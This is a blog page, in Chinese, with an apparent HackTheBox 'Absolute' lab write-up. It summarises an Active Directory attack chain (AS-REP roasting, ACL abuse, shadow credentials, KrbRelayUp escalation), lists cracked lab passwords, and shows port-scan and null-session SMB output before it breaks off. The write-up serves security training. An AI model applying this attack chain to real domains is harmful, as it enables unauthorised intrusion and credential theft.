@@ -1,0 +1,834 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="大梦一场的董二千先生 推开窗户 举起望远镜 眼底映出 一阵浓烟 前已无通路 后不见归途  知识点与路径总结靶机信息：10.129.232.60，域 absolute.htb，Windows Server 2019 域控（DC），难度 Hard。 核心知识点  OSINT 用户名收集：从网站图片 EXIF 元数据（Author&#x2F;Artist 字段）提取真实姓名，按常见企业命名规则批量生成用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Absolute">
+<meta property="og:url" content="http://example.com/2026/09/02/HackTheBox-Absolute/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="大梦一场的董二千先生 推开窗户 举起望远镜 眼底映出 一阵浓烟 前已无通路 后不见归途  知识点与路径总结靶机信息：10.129.232.60，域 absolute.htb，Windows Server 2019 域控（DC），难度 Hard。 核心知识点  OSINT 用户名收集：从网站图片 EXIF 元数据（Author&#x2F;Artist 字段）提取真实姓名，按常见企业命名规则批量生成用">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-09-02T12:24:58.000Z">
+<meta property="article:modified_time" content="2026-09-02T14:54:56.810Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HackTheBox-Absolute - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/ga-widget.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":"G-42BJJZNR1L"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-42BJJZNR1L", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', 'G-42BJJZNR1L');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Absolute"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-09-02 20:24" pubdate>
+          September 2, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          43 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HackTheBox-Absolute</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>大梦一场的董二千先生 推开窗户 举起望远镜 眼底映出 一阵浓烟 前已无通路 后不见归途</p>
+<hr>
+<h2 id="知识点与路径总结"><a href="#知识点与路径总结" class="headerlink" title="知识点与路径总结"></a>知识点与路径总结</h2><p><strong>靶机信息</strong>：<code>10.129.232.60</code>，域 <code>absolute.htb</code>，Windows Server 2019 域控（DC），难度 Hard。</p>
+<p><strong>核心知识点</strong></p>
+<ul>
+<li><strong>OSINT 用户名收集</strong>：从网站图片 EXIF 元数据（<code>Author</code>&#x2F;<code>Artist</code> 字段）提取真实姓名，按常见企业命名规则批量生成用户名字典。</li>
+<li><strong>Kerberos 用户枚举</strong>：用 <code>kerbrute userenum</code> 通过 KDC 的预认证响应差异（<code>KDC_ERR_PREAUTH_REQUIRED</code> vs <code>PRINCIPAL_UNKNOWN</code>）验证域内有效用户名，无需任何凭据。</li>
+<li><strong>AS-REP Roasting</strong>：针对关闭了 Kerberos 预认证（<code>DONT_REQUIRE_PREAUTH</code>）的账户，离线爆破 AS-REP 报文中用用户口令派生密钥加密的部分。</li>
+<li><strong>禁用 NTLM 环境下的 Kerberos 认证</strong>：<code>STATUS_ACCOUNT_RESTRICTION</code> 表明目标禁用了 NTLM，必须先 <code>getTGT</code> 申请 Kerberos 票据（ccache）再走 <code>-k</code> 认证。</li>
+<li><strong>信息泄露横向移动</strong>：用户描述字段泄露 <code>svc_smb</code> 口令 → SMB 共享中的 <code>test.exe</code> 运行后通过 LDAP 流量抓包泄露 <code>m.lovegod</code> 口令。</li>
+<li><strong>基于 ACL 的权限提升</strong>：<code>WriteOwner</code> → <code>dacledit</code> 授予 <code>FullControl</code> → 加组 → <code>GenericWrite</code>，借助 BloodHound 分析并利用 ACL 攻击链。</li>
+<li><strong>影子凭据（Shadow Credentials）攻击</strong>：利用 <code>msDS-KeyCredentialLink</code> 属性写入，用 <code>certipy shadow auto</code> 为目标账户申请证书并 PKINIT 获取 TGT 与 NT hash。</li>
+<li><strong>KrbRelay &#x2F; KrbRelayUp 本地提权</strong>：Kerberos 中继实现本地系统提权（受”受保护的用户”组限制的注意事项）。</li>
+</ul>
+<p><strong>攻击路径</strong></p>
+<ol>
+<li>端口扫描 → 识别为域控（53&#x2F;88&#x2F;389&#x2F;636&#x2F;…）。</li>
+<li>网站图片 EXIF → 提取 6 个作者姓名 → 生成用户名字典。</li>
+<li><code>kerbrute</code> 验证出 6 个有效用户 → <code>impacket-GetNPUsers</code> 发现 <code>d.klay</code> 可 AS-REP Roasting。</li>
+<li><code>john</code> 爆破得到 <code>d.klay / Darkmoonsky248girl</code>。</li>
+<li>NTLM 被禁用（<code>STATUS_ACCOUNT_RESTRICTION</code>）→ <code>getTGT</code> 走 Kerberos → 枚举用户，描述字段泄露 <code>svc_smb / AbsoluteSMBService123!</code>。</li>
+<li><code>svc_smb</code> 读取 <code>Shared</code> 共享 → 运行 <code>test.exe</code> 抓包 → LDAP 流量泄露 <code>m.lovegod / AbsoluteLDAP2022!</code>。</li>
+<li>BloodHound 分析 ACL 链：<code>m.lovegod</code>（Networkers 组）→ <code>WriteOwner</code> → <code>Network Audit</code> → <code>GenericWrite</code> → <code>winrm_user</code>。</li>
+<li><code>owneredit</code> + <code>dacledit</code> + 加组 → 对 <code>winrm_user</code> 做影子凭据攻击（<code>certipy shadow auto</code>）→ 拿到 TGT&#x2F;NT hash → <code>evil-winrm</code> 登录取得 <strong>user.txt</strong>。</li>
+<li>上传 <code>KrbRelayUp</code> 等工具，利用 KrbRelay 技术本地提权至 <strong>SYSTEM</strong>（root）。</li>
+</ol>
+<hr>
+<p>端口扫描</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kaada)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop]<br>└─<span class="hljs-comment"># ./rustscan -a 10.129.232.60 </span><br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  <span class="hljs-symbol">/</span>  ___&#125; <span class="hljs-symbol">/</span> &#123;&#125; \ |  `| |<br>| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;<span class="hljs-symbol">/</span>  <span class="hljs-operator">/</span>\  \| |\  |<br>`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;<br>The Modern Day Port Scanner.<br><span class="hljs-params">________________________________________</span><br><span class="hljs-params">:</span> http:<span class="hljs-symbol">//discord.skerritt.blog</span>         :<br>: https:<span class="hljs-symbol">//github.com/RustScan/RustScan</span> :<br> <span class="hljs-operator">-</span>-------------------------------------<br><span class="hljs-params">RustScan:</span> Making sure &#x27;closed&#x27; isn&#x27;t just a state of mind.<br><br>[~] The config file is expected to be at <span class="hljs-string">&quot;/root/.rustscan.toml&quot;</span><br>[<span class="hljs-operator">!</span>] File limit is lower than default batch size. Consider upping <span class="hljs-keyword">with</span> <span class="hljs-operator">-</span>-ulimit. May cause harm to sensitive servers<br>[<span class="hljs-operator">!</span>] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, <span class="hljs-keyword">or</span> up the Ulimit <span class="hljs-keyword">with</span> &#x27;--ulimit <span class="hljs-number">5000</span>&#x27;. <br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">53</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">80</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">88</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">135</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">139</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">389</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">593</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">636</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">3268</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">3269</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">5985</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">9389</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">47001</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">49664</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">49665</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">49667</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">49666</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">49674</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">49673</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">49675</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">49683</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">49688</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">49703</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span>:<span class="hljs-number">57101</span><br>[~] Starting Script(s)<br>[~] Starting Nmap <span class="hljs-number">7.99</span> ( https:<span class="hljs-symbol">//nmap.org</span> ) at <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>9-<span class="hljs-number">02</span> <span class="hljs-number">12</span>:<span class="hljs-number">29</span> <span class="hljs-operator">+</span><span class="hljs-number">0000</span><br>Initiating Ping Scan at <span class="hljs-number">12</span>:<span class="hljs-number">29</span><br>Scanning <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span> [<span class="hljs-number">4</span> ports]<br>Completed Ping Scan at <span class="hljs-number">12</span>:<span class="hljs-number">29</span>, <span class="hljs-number">0.12</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">12</span>:<span class="hljs-number">29</span><br>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">12</span>:<span class="hljs-number">29</span>, <span class="hljs-number">0.50</span>s elapsed<br>DNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.50</span>s. <span class="hljs-params">Mode:</span> Async [<span class="hljs-comment">#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br>Initiating SYN Stealth Scan at <span class="hljs-number">12</span>:<span class="hljs-number">29</span><br>Scanning <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span> [<span class="hljs-number">24</span> ports]<br>Discovered open port <span class="hljs-number">139</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">80</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">135</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">49703</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">47001</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">49675</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">9389</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">53</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">636</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">57101</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">3269</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">49665</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">49674</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">593</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">49688</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">49667</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">49666</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">49673</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">49664</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">5985</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">88</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">3268</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">389</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Discovered open port <span class="hljs-number">49683</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Completed SYN Stealth Scan at <span class="hljs-number">12</span>:<span class="hljs-number">29</span>, <span class="hljs-number">0.28</span>s elapsed (<span class="hljs-number">24</span> total ports)<br>Nmap scan report for <span class="hljs-number">10.129</span>.<span class="hljs-number">232.60</span><br>Host is up, received echo-reply ttl <span class="hljs-number">127</span> (<span class="hljs-number">0.10</span>s latency).<br>Scanned at <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>9-<span class="hljs-number">02</span> <span class="hljs-number">12</span>:<span class="hljs-number">29</span>:<span class="hljs-number">31</span> UTC for <span class="hljs-number">0</span>s<br><br>PORT      STATE SERVICE          REASON<br><span class="hljs-number">53</span><span class="hljs-symbol">/tcp</span>    open  domain           syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">80</span><span class="hljs-symbol">/tcp</span>    open  http             syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">88</span><span class="hljs-symbol">/tcp</span>    open  kerberos-sec     syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">135</span><span class="hljs-symbol">/tcp</span>   open  msrpc            syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">139</span><span class="hljs-symbol">/tcp</span>   open  netbios-ssn      syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">389</span><span class="hljs-symbol">/tcp</span>   open  ldap             syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">593</span><span class="hljs-symbol">/tcp</span>   open  http-rpc-epmap   syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">636</span><span class="hljs-symbol">/tcp</span>   open  ldapssl          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">3268</span><span class="hljs-symbol">/tcp</span>  open  globalcatLDAP    syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">3269</span><span class="hljs-symbol">/tcp</span>  open  globalcatLDAPssl syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">5985</span><span class="hljs-symbol">/tcp</span>  open  wsman            syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">9389</span><span class="hljs-symbol">/tcp</span>  open  adws             syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">47001</span><span class="hljs-symbol">/tcp</span> open  winrm            syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49664</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49665</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49666</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49667</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49673</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49674</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49675</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49683</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49688</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49703</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">57101</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><br>Read data files <span class="hljs-params">from:</span> <span class="hljs-symbol">/usr/share/nmap</span><br>Nmap <span class="hljs-params">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.99</span> seconds<br>           Raw packets <span class="hljs-params">sent:</span> <span class="hljs-number">28</span> (<span class="hljs-number">1.208</span>KB) | <span class="hljs-params">Rcvd:</span> <span class="hljs-number">25</span> (<span class="hljs-number">1.084</span>KB)<br><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.232</span><span class="hljs-number">.60</span> -u <span class="hljs-string">&#x27;&#x27;</span> -p <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">--shares</span><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.232</span><span class="hljs-number">.60</span>   <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:DC) (<span class="hljs-keyword">domain</span>:absolute.htb) (signing:<span class="hljs-keyword">True</span>) 